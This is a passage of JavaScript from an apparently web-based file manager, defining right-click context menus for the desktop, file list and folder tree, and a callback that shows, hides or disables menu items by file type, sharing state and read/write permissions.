	var bindFavPath = function(){
		//列表
		$('<i class="menuFavPath"></i>').appendTo('#rightMenu');
		$.contextMenu({
			zIndex:9999,
			selector: '.menuFavPath',
			callback: function(key, options) {menuPath(key);},
			items: {
				"open":{name:LNG.open+'<b>Enter</b>',className:"open",icon:"external-link",accesskey: "o"},
				"sep0":"--------",
				"fav_remove":{name:LNG.fav_remove,className:"fav_remove",icon:"trash",accesskey: "r"},
				//"fav_page":{name:LNG.manage_fav,className:"fav_page",icon:"star",accesskey: "f"},
				"sep1":"--------",
				"info":{name:LNG.info,className:"info",icon:"info",accesskey: "i"}
			}
		});

		$('<i class="menuFavPathMore"></i>').appendTo('#rightMenu');
		$.contextMenu({
			zIndex:9999,
			selector: '.menuFavPathMore',
			className:'menuFavPathMore',
			callback: function(key, options) {menuPath(key);},
			items: {
				"fav_remove":{name:LNG.fav_remove,className:"fav_remove",icon:"trash",accesskey: "r"}
			}
		});
	}

	//___________________________________________________________________________________
	//桌面右键& 资源管理器右键动作
	var menuBody = function(action) {
		switch(action){
			case 'refresh':ui.f5(true,true);break;
			case 'back':ui.path.history.back();break;
			case 'next':ui.path.history.next();break;
			case 'seticon': ui.setListType('icon');break;//大图标显示
			case 'setlist':ui.setListType('list');break;//列表显示
			case 'setlist_split':ui.setListType('list_split');break;//列表显示

			case 'set_sort_name':ui.setListSort('name',0);break;//排序方式，名称
			case 'set_sort_ext':ui.setListSort('ext',0);break;//排序方式，扩展名
			case 'set_sort_size':ui.setListSort('size',0);break;//排序方式，大小
			case 'set_sort_mtime':ui.setListSort('mtime',0);break;//排序方式，修改时间
			case 'set_sort_up':ui.setListSort(0,'up');break;//已有模式升序
			case 'set_sort_down':ui.setListSort(0,'down');break;//已有模式降序
			case 'upload':core.upload();break;
			case 'recycle_clear':ui.path.recycleClear();break;

			case 'box-size-smallx':ui.setFileIconSize(40);break;
			case 'box-size-small':ui.setFileIconSize(60);break;
			case 'box-size-default':ui.setFileIconSize(80);break;
			case 'box-size-big':ui.setFileIconSize(150);break;
			case 'box-size-bigx':ui.setFileIconSize(220);break;

			case 'past':ui.path.past();break;  //粘贴到当前文件夹
			case 'copy_see':ui.path.clipboard();break;  //查看剪贴板
			case 'newfolder':ui.path.newFolder();break;  //新建文件夹
			case 'newfile':ui.path.newFile('txt');break;//新建文件
			case 'newfile_null':ui.path.newFile('');break;//新建文件
			case 'newfile_md':ui.path.newFile('md');break;//新建文件
			case 'newfile_html':ui.path.newFile('html');break;
			case 'newfile_php':ui.path.newFile('php');break;
			case 'newfile_js':ui.path.newFile('js');break;
			case 'newfile_css':ui.path.newFile('css');break;
			case 'newfile_oexe':ui.path.newFile('oexe');break;
			case 'newfile_docx':ui.path.newFile('docx');break;
			case 'newfile_xlsx':ui.path.newFile('xlsx');break;
			case 'newfile_pptx':ui.path.newFile('pptx');break;
			case 'info':ui.path.info();break;

			case 'open':ui.path.open();break;
			case 'app_install':ui.path.appList();break;
			case 'app_create':ui.path.appEdit(true);break;

			//桌面会用到
			case 'setting':core.setting();break;
			case 'setting_theme':core.setting('theme');break;
			case 'setting_wall':core.setting('wall');break;
			default:break;
		}
	};

	//目录右键绑定(文件、文件夹) 树目录文件(夹)
	var menuPath = function(action) {
		switch(action){
			case 'open':ui.path.open();break;
			case 'down':ui.path.download();break;
			case 'share':ui.path.share();break;
			case 'open_ie':ui.path.openWindow();break;
			case 'open_text':ui.path.openEditor();break;
			case 'app_edit':ui.path.appEdit();break;
			case 'playmedia':ui.path.play();break;

			case 'share_edit':ui.path.shareEdit();break;
			case 'share_open_window':ui.path.shareOpenWindow();break;
			case 'share_open_path':ui.path.shareOpenPath();break;

			case 'fav':ui.path.fav();break;//添加到收藏夹
			case 'search':ui.path.search();break;

			case 'copy':ui.path.copy();break;
			case 'clone':ui.path.copyDrag(G.this_path,true);break;
			case 'cute':ui.path.cute();break;
			case 'cute_to':ui.path.cuteTo();break;
			case 'copy_to':ui.path.copyTo();break;

			case 'remove':ui.path.remove();break;
			case 'rname':ui.path.rname();break;
			case 'zip_zip':ui.path.zip();break;
			case 'zip_tar':ui.path.zip('tar');break;
			case 'zip_tgz':ui.path.zip('tar.gz');break;

			case 'unzip_folder':ui.path.unZip();break;
			case 'unzip_this':ui.path.unZip('to_this');break;
			case 'unzip_to':ui.path.unZip('unzip_to_folder');break;
			case 'setBackground':ui.path.setBackground();break;
			case 'createLinkHome':ui.path.createLink(false);break;
			case 'createLink':ui.path.createLink(true);break;
			case 'createProject':ui.path.createProject();break;
			case 'openProject':ui.path.openProject();break;
			case 'explorer':ui.path.explorer();break;
			case 'explorerNew':ui.path.explorerNew();break;

			case 'fav_page':core.setting('fav');break;
			case 'fav_remove':ui.path.favRemove();break;

			case 'info':ui.path.info();break;
			default:
				menuBody(action);//文件管理
				break;
		}
	};

	//=============================tree start=============================
	//资源管理器tree 右键绑定
	var bindTreeFav = function(){
		//根目录
		$('<i class="menuTreeFavRoot"></i>').appendTo('#rightMenu');
		$.contextMenu({
			zIndex:9999,
			selector: '.menuTreeFavRoot',
			callback: function(key, options) {menuTree(key);},
			items: {
				//"fav_page":{name:LNG.manage_fav,className:"fav_page",icon:"star",accesskey: "r"},
				//"sep1":"--------",
				"refresh":{name:LNG.refresh,className:"refresh",icon:"refresh",accesskey: "e"}
			}
		});
		//列表
		$('<i class="menuTreeFav"></i>').appendTo('#rightMenu');
		$.contextMenu({
			zIndex:9999,
			selector: '.menuTreeFav',
			callback: function(key, options) {menuTree(key);},
			items: {
				"fav_remove":{name:LNG.fav_remove,className:"fav_remove",icon:"trash",accesskey: "r"},
				"fav_page":{name:LNG.manage_fav,className:"fav_page",icon:"star",accesskey: "f"},
				"sep2":"--------",
				"createLinkHome":{name:LNG.createLinkHome,className:"createLinkHome",icon:"location-arrow",accesskey: "l"},
				"refresh":{name:LNG.refresh_tree,className:"refresh",icon:"refresh",accesskey: "e"},
				"info":{name:LNG.info,className:"info",icon:"info",accesskey: "i"}
			}
		});
	}
	
	var bindTreeRoot = function(){
		$('<i class="'+selectTreeSelectorRoot.substr(1)+'"></i>').appendTo('#rightMenu');
		$.contextMenu({
			zIndex:9999,
			selector: selectTreeSelectorRoot,
			callback: function(key, options) {menuTree(key);},
			items: {
				"explorer":{name:LNG.manage_folder,className:"explorer",icon:"laptop",accesskey: "v"},
				"refresh":{name:LNG.refresh_tree,className:"refresh",icon:"refresh",accesskey: "e"},
				"sep1":"--------",
				"past":{name:LNG.past,className:"past",icon:"paste",accesskey: "p"},
				"newfolder":{name:LNG.newfolder,className:"newfolder",icon:"folder-close-alt",accesskey: "n"},
				//"newfile":{name:LNG.newfile,className:"newfile",icon:"file-text-alt",accesskey: "j"},
				"sep2":"--------",
				"fav":{name:LNG.add_to_fav,className:"fav",icon:"star",accesskey: "f"},
				//"search":{name:LNG.search_in_path,className:"search",icon:"search",accesskey: "s"}
			}
		});
	}
	var bindTreeFolder = function(){
		$('<i class="'+selectTreeSelectorFolder.substr(1)+'"></i>').appendTo('#rightMenu');
		$.contextMenu({
			zIndex:9999,
			selector: selectTreeSelectorFolder,
			callback: function(key, options) {menuTree(key);},
			items: {
				"refresh":{name:LNG.refresh_tree,className:"refresh",icon:"refresh",accesskey: "e"},
				"sep1":"--------",
				"copy":{name:LNG.copy,className:"copy",icon:"copy",accesskey: "c"},
				"cute":{name:LNG.cute,className:"cute",icon:"cut",accesskey: "k"},
				"past":{name:LNG.past,className:"past",icon:"paste",accesskey: "p"},
				"rname":{name:LNG.rename,className:"rname",icon:"pencil",accesskey: "r"},
				"remove":{name:LNG.remove,className:"remove",icon:"trash",accesskey: "d"},
				"sep2":"--------",
				"newfolder":{name:LNG.newfolder,className:"newfolder",icon:"folder-close-alt",accesskey: "n"},
				//"search":{name:LNG.search_in_path,className:"search",icon:"search",accesskey: "s"},
				"fav":{name:LNG.add_to_fav,className:"fav",icon:"star"},
				//"others":{
				//	name:LNG.more,
				//	icon:"ellipsis-horizontal",
				//	accesskey: "m",
				//	items:{
						//"explorer":{name:LNG.manage_folder,className:"explorer",icon:"laptop",accesskey:"v"},
						//"clone":{name:LNG.clone,className:"clone",icon:"external-link",accesskey: "l"},
						
						//"share":{name:LNG.share,className:"share",icon:"share-sign",accesskey: "e"},
						//"sep105":"--------",
						//"createLinkHome":{name:LNG.createLinkHome,className:"createLinkHome",icon:"location-arrow",accesskey: "l"},					
						//"openProject":{name:LNG.openProject,className:"openProject",icon:"edit"}
				//	}
				//},
				"sep3":"--------",
				"info":{name:LNG.info+'<b class="ml-20"></b>',className:"info",icon:"info",accesskey: "i"}
			}
		});
	}
	var bindTreeFolderEditor = function(){
		$('<i class="'+selectTreeSelectorFolder.substr(1)+'"></i>').appendTo('#rightMenu');
		$.contextMenu({
			zIndex:9999,
			selector: selectTreeSelectorFolder,
			callback: function(key, options) {menuTree(key);},
			items: {
				"explorer":{name:LNG.manage_folder,className:"explorer",icon:"laptop",accesskey: "v"},
				"download":{name:LNG.download,className:"download",icon:"cloud-download",accesskey: "x"},
				"refresh":{name:LNG.refresh_tree,className:"refresh",icon:"refresh",accesskey: "e"},
				"sep1":"--------",
				"copy":{name:LNG.copy,className:"copy",icon:"copy",accesskey: "c"},
				"cute":{name:LNG.cute,className:"cute",icon:"cut",accesskey: "k"},
				"past":{name:LNG.past,className:"past",icon:"paste",accesskey: "p"},
				"rname":{name:LNG.rename,className:"rname",icon:"pencil",accesskey: "r"},
				"remove":{name:LNG.remove,className:"remove",icon:"trash",accesskey: "d"},
				"sep2":"--------",
				"newfolder":{name:LNG.newfolder,className:"newfolder",icon:"folder-close-alt",accesskey: "n"},
				"newfileOther":commonMenu["newfileOther"],
				//"search":{name:LNG.search_in_path,className:"search",icon:"search",accesskey: "s"},
				"open_ie":{name:LNG.open_ie,className:"open_ie",icon:"globe"},
				"others":{
					name:LNG.more,
					icon:"ellipsis-horizontal",
					accesskey: "m",
					className:"more_action",
					items:{
						"explorer":{name:LNG.manage_folder,className:"explorer",icon:"laptop",accesskey:"v"},
						"clone":{name:LNG.clone,className:"clone",icon:"external-link",accesskey: "l"},
						"fav":{name:LNG.add_to_fav,className:"fav",icon:"star"},
						"share":{name:LNG.share,className:"share",icon:"share-sign",accesskey: "e"},
						"sep106":"--------",
						"createLinkHome":{name:LNG.createLinkHome,className:"createLinkHome",icon:"location-arrow",accesskey: "l"},						
						"openProject":{name:LNG.openProject,className:"openProject",icon:"edit"}
					}
				},
				"sep3":"--------",
				"info":{name:LNG.info+'<b class="ml-20">Alt+I</b>',className:"info",icon:"info",accesskey: "i"}
			}
		});
	};
	var bindTreeGroupRoot = function(){
		$('<i class="'+selectTreeSelectorGroupRoot.substr(1)+'"></i>').appendTo('#rightMenu');
		$.contextMenu({
			zIndex:9999,
			selector: selectTreeSelectorGroupRoot,
			callback: function(key, options) {menuTree(key);},
			items: {
				"refresh":{name:LNG.refresh,className:"refresh",icon:"refresh",accesskey: "e"}
			}
		});
	}
	var bindTreeGroup = function(){
		$('<i class="'+selectTreeSelectorGroup.substr(1)+'"></i>').appendTo('#rightMenu');
		$.contextMenu({
			zIndex:9999,
			selector: selectTreeSelectorGroup,
			callback: function(key, options) {menuTree(key);},
			items: {
				"fav":{name:LNG.add_to_fav,className:"fav",icon:"star",accesskey: "f"},
				"createLinkHome":{name:LNG.createLinkHome,className:"createLinkHome",icon:"location-arrow",accesskey: "l"}
			}
		});
	}
	var bindTreeUser = function(){
		$('<i class="'+selectTreeSelectorUser.substr(1)+'"></i>').appendTo('#rightMenu');
		$.contextMenu({
			zIndex:9999,
			selector: selectTreeSelectorUser,
			callback: function(key, options) {
				var $target = options.$trigger;
				if($target.hasClass('file')){//文件夹列表
					menuPath(key);
				}else{//树目录
					menuTree(key);
				}
			},
			items: {
				"fav":{name:LNG.add_to_fav,className:"fav",icon:"star",accesskey: "f"},
				"createLinkHome":{name:LNG.createLinkHome,className:"createLinkHome",icon:"location-arrow",accesskey: "l"}
			}
		});
	}

	var bindEditorFile = function(){
		$('<i class="'+selectTreeSelectorFile.substr(1)+'"></i>').appendTo('#rightMenu');
		$.contextMenu({
			zIndex:9999,
			selector: selectTreeSelectorFile,
			callback: function(key, options) {menuTree(key);},
			items: {
				"open":{name:LNG.open,className:"open",icon:"external-link",accesskey: "o"},
				
				"edit":{name:LNG.edit,className:"edit",icon:"edit",accesskey: "e"},
				"download":{name:LNG.download,className:"download",icon:"cloud-download",accesskey: "x"},
				"sep1":"--------",
				"copy":{name:LNG.copy,className:"copy",icon:"copy",accesskey: "c"},
				"cute":{name:LNG.cute,className:"cute",icon:"cut",accesskey: "k"},
				"rname":{name:LNG.rename,className:"rname",icon:"pencil",accesskey: "r"},
				"remove":{name:LNG.remove,className:"remove",icon:"trash",accesskey: "d"},
				"sep2":"--------",
				"open_ie":{name:LNG.open_ie,className:"open_ie",icon:"globe"},
				"clone":{name:LNG.clone,className:"clone",icon:"external-link",accesskey: "l"},
				"others":{
					name:LNG.more,
					icon:"ellipsis-horizontal",
					accesskey: "m",
					className:"more_action",
					items:{
						"fav":{name:LNG.add_to_fav,className:"fav",icon:"star"},						
						"share":{name:LNG.share,className:"share",icon:"share-sign",accesskey: "e"},
						"createLinkHome":{name:LNG.createLinkHome,className:"createLinkHome",icon:"location-arrow",accesskey: "l"}
					}
				},
				"sep3":"--------",
				"info":{name:LNG.info+'<b class="ml-20">Alt+I</b>',className:"info",icon:"info",accesskey: "i"}
			}
		});
	};

	var menuTree = function(action) {//多选，右键操作
		switch(action){
			case 'edit':ui.tree.openEditor();break;
			case 'open':ui.tree.open();break;
			case 'refresh':ui.tree.refresh();break;
			case 'copy':ui.tree.copy();break;
			case 'cute':ui.tree.cute();break;
			case 'past':ui.tree.past();break;
			case 'clone':ui.tree.clone();break;
			case 'rname':ui.tree.rname();break;
			case 'remove':ui.tree.remove();break;
			case 'info':ui.tree.info();break;
			case 'cute_to':ui.tree.cuteTo();break;
			case 'copy_to':ui.tree.copyTo();break;

			case 'download':ui.tree.download();break;
			case 'open_ie':ui.tree.openWindow();break;
			case 'search':ui.tree.search();break;
			case 'share':ui.tree.share();break;
			case 'search':ui.tree.search();break;

			case 'newfolder':ui.tree.create('folder');break;
			case 'newfile':ui.tree.create('txt');break;//新建文件
			case 'newfile_html':ui.tree.create('html');break;
			case 'newfile_php':ui.tree.create('php');break;
			case 'newfile_js':ui.tree.create('js');break;
			case 'newfile_css':ui.tree.create('css');break;
			case 'newfile_oexe':ui.tree.create('oexe');break;

			case 'explorer':ui.tree.explorer();break;
			case 'openProject':ui.tree.openProject();break;
			case 'fav_page':core.setting('fav');break;
			case 'fav':ui.tree.fav();break;//添加当前到收藏夹
			case 'createLinkHome':ui.tree.createLink(false);break;
			case 'fav_remove':ui.tree.favRemove();break;//移除收藏夹

			case 'refresh_all':ui.tree.init();break;
			case 'quit':;break;
			default:break;
		}
	};
	//=============================tree end==========================

	return{
		initDesktop:initDesktop,
		initExplorer:initExplorer,
		initEditor:initEditor,
		show:function(select,left,top){
			if (!select) return;
			rightMenu.hidden();
			$(select).contextMenu({x:left, y:top});
		},
		//菜单显示回调
		menuShow:function(){
			var hideClass = 'hidden';
			var disableClass = "disabled"; // disabled hidden
			var $theMenu = $('.context-menu-list').filter(':visible');
			var $focus = $('.context-menu-active');
			if ($theMenu.length==0 || $focus.length==0) return;
			if($focus.hasClass("menuTreeFolder") && $focus.hasClass("level0")){
				$theMenu.find('.copy').addClass(hideClass);
				$theMenu.find('.cute').addClass(hideClass);
				$theMenu.find('.past').addClass(hideClass);
				$theMenu.find('.rname').addClass(hideClass);
				$theMenu.find('.remove').addClass(hideClass);
				$theMenu.find('.context-menu-separator').addClass(hideClass);
				$theMenu.find('.newfolder').addClass(hideClass);
				$theMenu.find('.search').addClass(hideClass);
				$theMenu.find('.info').addClass(hideClass);
				$theMenu.find('.context-menu-submenu').addClass(hideClass);
			}else{
				$theMenu.find('.copy').removeClass(hideClass);
				$theMenu.find('.cute').removeClass(hideClass);
				$theMenu.find('.past').removeClass(hideClass);
				$theMenu.find('.rname').removeClass(hideClass);
				$theMenu.find('.context-menu-separator').removeClass(hideClass);
				$theMenu.find('.newfolder').removeClass(hideClass);
				$theMenu.find('.search').removeClass(hideClass);
				$theMenu.find('.info').removeClass(hideClass);
				$theMenu.find('.context-menu-submenu').removeClass(hideClass);
				if($focus.hasClass('menufile') && $focus.find(".ico").attr("filetype") == 'zip'){
					$theMenu.find('.open').addClass(hideClass);
				}else{
					$theMenu.find('.open').removeClass(hideClass);
				}
				if($focus.hasClass('menufile') && $focus.find(".ico").attr("filetype") == 'oexe'){
					$theMenu.find('.copy').addClass(hideClass);
					$theMenu.find('.share').addClass(hideClass);
					$theMenu.find('.cute').addClass(hideClass);
					$theMenu.find('.rname').addClass(hideClass);
					$theMenu.find('.remove').addClass(hideClass);
					$theMenu.find('.fav').addClass(hideClass);
					$theMenu.find('.info').addClass(hideClass);
					$theMenu.find('.context-menu-separator').addClass(hideClass);
					
				}else{
					$theMenu.find('.copy').removeClass(hideClass);
					$theMenu.find('.share').removeClass(hideClass);
					$theMenu.find('.cute').removeClass(hideClass);
					$theMenu.find('.rname').removeClass(hideClass);
					$theMenu.find('.remove').removeClass(hideClass);
					$theMenu.find('.fav').removeClass(hideClass);
					$theMenu.find('.info').removeClass(hideClass);
					$theMenu.find('.context-menu-separator').removeClass(hideClass);
					if($focus.attr('sub') == '1'){
						$theMenu.find('.open_the_path').addClass(hideClass);
						$theMenu.find('.share_edit').addClass(hideClass);
						$theMenu.find('.remove').addClass(hideClass);
						$theMenu.find('.down').addClass(hideClass);
						$theMenu.find('.context-menu-separator').addClass(hideClass);
						if($focus.hasClass('menuSharePath')){
							$theMenu.find('.down').removeClass(hideClass);
						}
					}else{
						$theMenu.find('.open_the_path').removeClass(hideClass);
						$theMenu.find('.share_edit').removeClass(hideClass);
						$theMenu.find('.remove').removeClass(hideClass);
						$theMenu.find('.down').removeClass(hideClass);
						$theMenu.find('.context-menu-separator').removeClass(hideClass);
						if($focus.hasClass('menuSharePath') && $focus.attr('uid') != G.uid){
							$theMenu.find('.share_edit').addClass(hideClass);
							$theMenu.find('.remove').addClass(hideClass);
							$theMenu.find('.open_the_path').addClass(hideClass);
							$theMenu.find('.context-menu-separator').eq(0).addClass(hideClass);
						}else{
							$theMenu.find('.share_edit').removeClass(hideClass);
							$theMenu.find('.remove').removeClass(hideClass);
							$theMenu.find('.open_the_path').removeClass(hideClass);
							$theMenu.find('.context-menu-separator').eq(0).removeClass(hideClass);
							if($focus.parents('#folderList_2').find('.menuTreeGroupRoot').length == 1){
								$theMenu.find('.copy').addClass(hideClass);
								$theMenu.find('.cute').addClass(hideClass);
								$theMenu.find('.past').addClass(hideClass);
								$theMenu.find('.rname').addClass(hideClass);
								$theMenu.find('.remove').addClass(hideClass);
								$theMenu.find('.remove').addClass(hideClass);
								$theMenu.find('.newfolder').addClass(hideClass);
								$theMenu.find('.info').addClass(hideClass);
								$theMenu.find('.context-menu-separator').addClass(hideClass);
								
							}else{
								$theMenu.find('.refresh').removeClass(hideClass);
							}
						}
					}
				}		
			}
			//&& $focus.find(".ico").attr("filetype") == 'folder'
			$theMenu.find('.disable').addClass('disabled');
			if($focus.hasClass('menufile')){
				
				var ext = ui.fileLight.type(ui.fileLight.fileListSelect());
				
				//if($focus.find('.path_self_share')){
				//	alert(1)
				//}
				if (inArray(core.filetype['archive'],ext)) {
					$theMenu.find('.unzip').removeClass(hideClass);
				}else{
					$theMenu.find('.unzip').addClass(hideClass);
				}
				if (inArray(core.filetype['image'],ext)){
					$theMenu.find('.setBackground').removeClass(hideClass);
				}else{
					$theMenu.find('.setBackground').addClass(hideClass);
				}
				//oexe 编辑应用
				if (ext=='oexe') {
					$theMenu.find('.app_edit').removeClass(hideClass);
					$theMenu.find('.down').addClass(hideClass);
				}else{
					$theMenu.find('.app_edit').addClass(hideClass);
					$theMenu.find('.down').removeClass(hideClass);
					if($focus.find('.path_self_share').length == 1){
						$theMenu.find('.cute').addClass(hideClass);
					}else{
						$theMenu.find('.cute').removeClass(hideClass);
					}
				}
				
				//是否显示编辑
				if(inArray(core.filetype['image'],ext) ||
					inArray(core.filetype['music'],ext) ||
					inArray(core.filetype['movie'],ext) ||
					inArray(core.filetype['bindary'],ext)
					){
					$theMenu.find('.open_text').addClass(hideClass);
				}else{
					$theMenu.find('.open_text').removeClass(hideClass);
				}
			}

			//该文档读写权限对应右键功能可用
			if( $focus.hasClass('menufolder') ||
				$focus.hasClass('menufile') ||
				$focus.hasClass('menuTreeFolder') ||
				$focus.hasClass('menuTreeFile')){

				var menuNotWrite = '.cute,.rname,.remove,.zip';
				var menuNotRead = '.open,.open_text,.down,.share,.copy,.cute,.rname,.remove,.open_ie,.zip,.unzip_this,.unzip_folder,.search,.more_action';

				//不可读写
				if($focus.hasClass('file_not_readable')){
					$theMenu.find(menuNotRead).addClass(disableClass);
				}else{
					$theMenu.find(menuNotRead).removeClass(disableClass);
				}

				//只读
				if($focus.hasClass('file_not_writeable')){
					$theMenu.find(menuNotWrite).addClass(disableClass);
				}else{
					$theMenu.find(menuNotWrite).removeClass(disableClass);
				}
				if($focus.find('.path_self_share').length == 1){
					$theMenu.find('.cute').addClass(hideClass);
				}
			}
			//对话框，是否有iframe对应菜单隐藏显示
			if($focus.hasClass('dialog_menu')){
				var dlg_id = $focus.attr('id');
				var dialog = $.dialog.list[dlg_id];
				var theClass = hideClass;//'disabled' hideClass
				if (dialog.has_frame()) {
					$theMenu.find('.open_window').removeClass(theClass);
					$theMenu.find('.refresh').removeClass(theClass);
					$theMenu.find('.qrcode').removeClass(theClass);
				}else{
					$theMenu.find('.open_window').addClass(theClass);
					$theMenu.find('.refresh').addClass(theClass);
					$theMenu.find('.qrcode').addClass(theClass);
				}

				if($('.'+dlg_id).hasClass('dialog-can-resize')){
					$theMenu.find('.dialog_max').removeClass(theClass);
				}else{
					$theMenu.find('.dialog_max').addClass(theClass);
				}
			}

			//play list
			if($focus.hasClass('menuMore')){
				var needMenu = 0;
				ui.fileLight.fileListSelect().each(function(){
					var ext = core.pathExt(ui.fileLight.name($(this)));
					if (inArray(core.filetype['music'],ext)
						|| inArray(core.filetype['movie'],ext)){
						needMenu +=1;
					}
				});
				if(needMenu == 0){
					$theMenu.find('.playmedia').addClass(hideClass);
				}else{
					$theMenu.find('.playmedia').removeClass(hideClass);
				}
			}

			//zip文件预览右键解压，当前目录权限跟随
			if( $focus.hasClass('menuZipListFolder') ||
				$focus.hasClass('menuZipListFile') ){
				if(!core.pathCurrentWriteable()){
					$theMenu.find('.unzip_this').addClass(disableClass);
				}else{
					$theMenu.find('.unzip_this').removeClass(disableClass);
				}
			}

			//工具栏更多
			if( $focus.hasClass('toolPathMore')){
				ui.fileLight.menuResetMore();
			}
		},
		isDisplay:function(){//检测是否有右键菜单
			if($('.context-menu-list:visible').length==0){
				return false;
			}else{
				return true;
			}
		},
		hidden:function(){
			$('.context-menu-list')
				.filter(':visible')
				.filter(':not(.menuNotAutoHidden)')
				.trigger('contextmenu:hide');
		}
		
	}
});
